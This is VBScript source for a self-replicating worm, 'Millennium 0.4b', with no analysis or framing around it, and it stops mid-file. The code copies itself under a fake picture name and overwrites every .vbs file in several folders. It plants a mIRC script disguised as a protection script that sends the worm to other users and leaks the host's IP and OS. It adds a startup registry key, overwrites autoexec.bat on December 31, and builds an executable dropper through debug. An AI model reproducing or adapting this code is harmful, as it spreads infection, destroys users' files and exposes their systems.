' Millennium 0.4b vBS/mIRC =]
'

On Error Resume Next
dim worm, Map, f, b, Fool, a, fc, nf, fso, d, src, src2, src3

Const ForReading = 1, ForWriting = 2, ForAppending = 8

Set worm = CreateObject("Scripting.FileSystemObject")
Set w = worm.GetFile(WScript.ScriptFullName)
w.Copy ("c:\windows\system\MyPicture.bmp.vbs")
w.Copy ("c:\WINDOWS\Start Menu\Programs\StartUp\RunDLL.vbs")
w.Copy ("c:\My Documents\MyPicture.bmp.vbs")
w.Copy ("c:\MyPicture.bmp.vbs")
Set f = worm.OpenTextFile(WScript.ScriptFullName, 1)
wormcopy = f.ReadAll

Set Map = worm.GetFolder("c:\")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\My Documents")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\Windows")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\windows\samples\wsh")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile("c:\mirc\script.ini", True)
b.WriteLine "[script]"
b.WriteLine "n0=;mIRC Protection Script DO NOT EDIT!"
b.WriteLine "n1=;By Khaled Mardem-Bey"
b.WriteLine "n2=; www.mirc.com"
b.WriteLine "n3="
b.WriteLine "n4="
b.WriteLine "n5="
b.WriteLine "n6="
b.WriteLine "n7=on 1:CONNECT:{"
b.WriteLine "n8= //.msg #xmasday Hi. $server $port $ip $os $time $date %chan it's been $+ $duration($calc($ticks / 1000)) since my last reboot! Mil0.4b"
b.WriteLine "n9=}"
b.WriteLine "n10=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
b.WriteLine "n11= /.dcc send $nick c:\windows\system\MyPicture.bmp.vbs"
b.WriteLine "n12=}"
b.WriteLine "n13=on 1:NICK: { if ($nick == $me) .msg #xmasday OldNick was $nick }"
b.WriteLine "n14=on 1:notice:millennium*:?: .msg #xmasday 0,3 $time $nick Killed me, closing mIRC... *I Am Gone* | exit"
b.close

Set f = fso.OpenTextFile("c:\mirc\mirc.ini", 8, True)
f.WriteLine "n100=c:\mirc\script.ini"
f.Close
Set Regedit = CreateObject("WScript.Shell")
Regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinLoad", "c:\windows\system\MyPicture.bmp.vbs"

Set Fool = CreateObject("Scripting.FileSystemObject")
Set d = Fool.CreateTextFile("c:\Millennium.NFO", True)
d.WriteLine("Millennium 0.4b - mIRC/vBS")
d.WriteLine("Fear the Millennium")
d.close

On Error Resume Next
If Day(Now) = 31 and Month(Now) = 12 Then
MsgBox "Happy New Year!", vbApplicationModal, "The End"
Regedit.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Millennium 0.4b"
Regedit.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "uNF"
Regedit.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductName", "Winblows 2000"
Set Fso = CreateObject("scripting.filesystemobject")
Set f = Fso.opentextfile("c:\autoexec.bat", 2, True)
f.write "@Echo off"
f.write "Echo Your Computer is NOT Y2K Complient!"
f.write "Echo Sorry For this Inconvenience"
f.write "pause"
f.write "echo Millennium 0.4b"
f.write "pause"
f.Close
end if

'Hex Exe code section
Set short = CreateObject("Scripting.FileSystemObject")
Set d = short.CreateTextFile("short.src", True)
d.WriteLine("a 100") 'short.com src
d.WriteLine("push cs")
d.WriteLine("pop es")
d.WriteLine("cld")
d.WriteLine("mov bx,00c8")
d.WriteLine("mov ah,4a")
d.WriteLine("int 21")
d.WriteLine("mov sp,0c80")
d.WriteLine("mov ah,48")
d.WriteLine("mov bx,0300")
d.WriteLine("int 21")
d.WriteLine("mov [024a],ax")
d.WriteLine("mov ah,48")
d.WriteLine("mov bx,0150")
d.WriteLine("int 21")
d.WriteLine("mov bp,ax")
d.WriteLine("call 0153")
d.WriteLine("call 01d4")
d.WriteLine("call 0176")
d.WriteLine("call 01f5")
d.WriteLine("call 0134")
d.WriteLine("mov ax,4c00")
d.WriteLine("int 21")
d.WriteLine("mov dx,023f")
d.WriteLine("mov ah,3c")
d.WriteLine("xor cx,cx")
d.WriteLine("int 21")
d.WriteLine("jb 012f")
d.WriteLine("mov bx,ax")
d.WriteLine("mov cx,[024e]")
d.WriteLine("mov ds,bp")
d.WriteLine("xor dx,dx")
d.WriteLine("mov ax,4000")
d.WriteLine("int 21")
d.WriteLine("mov ah,3e")
d.WriteLine("int 21")
d.WriteLine("ret")
d.WriteLine("mov dx,0234")
d.WriteLine("mov ax,3d00")
d.WriteLine("int 21")
d.WriteLine("jb 012f")
d.WriteLine("mov bx,ax")
d.WriteLine("push ds")
d.WriteLine("mov cx,2ee0")
d.WriteLine("xor dx,dx")
d.WriteLine("mov ax,[024a]")
d.WriteLine("mov ds,ax")
d.WriteLine("mov ax,3f00")
d.WriteLine("int 21")
d.WriteLine("pop ds")
d.WriteLine("jb 012f")
d.WriteLine("mov [024c],ax")
d.WriteLine("ret")
d.WriteLine("xor bx,bx")
d.WriteLine("mov cx,[024c]")
d.WriteLine("mov ax,[024a]")
d.WriteLine("mov es,ax")
d.WriteLine("mov di,bx")
d.WriteLine("mov si,0252")
d.WriteLine("mov al,[si]")
d.WriteLine("repnz")
d.WriteLine("scasb")
d.WriteLine("jcxz 012f")
d.WriteLine("mov bx,di")
d.WriteLine("es:")
d.WriteLine("mov al,[di]")
d.WriteLine("inc di")
d.WriteLine("dec cx")
d.WriteLine("jcxz 012f")
d.WriteLine("call 01c0")
d.WriteLine("jb 018c")
d.WriteLine("inc si")
d.WriteLine("cmp al,[si]")
d.WriteLine("jnz 0181")
d.WriteLine("cmp si,025b")
d.WriteLine("jb 018c")
d.WriteLine("mov ax,di")
d.WriteLine("add ax,[0250]")
d.WriteLine("mov si,ax")
d.WriteLine("xor di,di")
d.WriteLine("mov cx,[024c]")
d.WriteLine("sub cx,si")
d.WriteLine("mov [024c],cx")
d.WriteLine("push ds")
d.WriteLine("push es")
d.WriteLine("pop ds")
d.WriteLine("repz")
d.WriteLine("movsb")
d.WriteLine("pop ds")
d.WriteLine("ret")
d.WriteLine("cmp al,30")
d.WriteLine("jb 01d2")
d.WriteLine("cmp al,39")
d.WriteLine("jbe 01d0")
d.WriteLine("cmp al,41")
d.WriteLine("jb 01d2")
d.WriteLine("cmp al,46")
d.WriteLine("ja 01d2")
d.WriteLine("clc")
d.WriteLine("ret")
d.WriteLine("stc")
d.WriteLine("ret")
d.WriteLine("push ds")
d.WriteLine("mov ax,[024a]")
d.WriteLine("mov es,ax")
d.WriteLine("xor si,si")
d.WriteLine("mov di,si")
d.WriteLine("mov cx,[024c]")
d.WriteLine("jcxz 01ef")
d.WriteLine("push es")
d.WriteLine("pop ds")
d.WriteLine("lodsb")
d.WriteLine("call 01c0")
d.WriteLine("jb 01ed")
d.WriteLine("stosb")
d.WriteLine("loop 01e6")
d.WriteLine("pop ds")
d.WriteLine("mov [024c],di")
d.WriteLine("ret")
d.WriteLine("push dx")
d.WriteLine("push ds")
d.WriteLine("xor dx,dx")
d.WriteLine("mov cx,[024c]")
d.WriteLine("shr cx,1")
d.WriteLine("mov es,bp")
d.WriteLine("mov ax,[024a]")
d.WriteLine("mov ds,ax")
d.WriteLine("xor si,si")
d.WriteLine("xor di,di")
d.WriteLine("call 0216")
d.WriteLine("loop 020a")
d.WriteLine("pop ds")
d.WriteLine("pop dx")
d.WriteLine("mov [024e],di")
d.WriteLine("ret")
d.WriteLine("push cx")
d.WriteLine("lodsw")
d.WriteLine("cmp al,39")
d.WriteLine("jbe 021e")
d.WriteLine("sub al,07")
d.WriteLine("sub al,30")
d.WriteLine("mov cl,04")
d.WriteLine("shl al,cl")
d.WriteLine("cmp ah,39")
d.WriteLine("jbe 022c")
d.WriteLine("sub ah,07")
d.WriteLine("sub ah,30")
d.WriteLine("add al,ah")
d.WriteLine("stosb")
d.WriteLine("pop cx")
d.WriteLine("ret")
d.WriteLine("")
d.WriteLine("e 234")
d.WriteLine("6C 63 6F 64 65 72 2E 68 65 78 00 6C")
d.WriteLine("e 240")
d.WriteLine("63 6F 64 65 72 2E 65 78 65 00 00 00 00 00 00 00")
d.WriteLine("e 250")
d.WriteLine("6E 00 36 32 36 35 36 37 36 39 36 45 00 00 00 00")
d.WriteLine("n short.com")
d.WriteLine("rcx")
d.WriteLine("15c")
d.WriteLine("w")
d.WriteLine("q")
d.close

Set fso = CreateObject("Scripting.FileSystemObject")
Set e = fso.CreateTextFile("fix.txt", True)
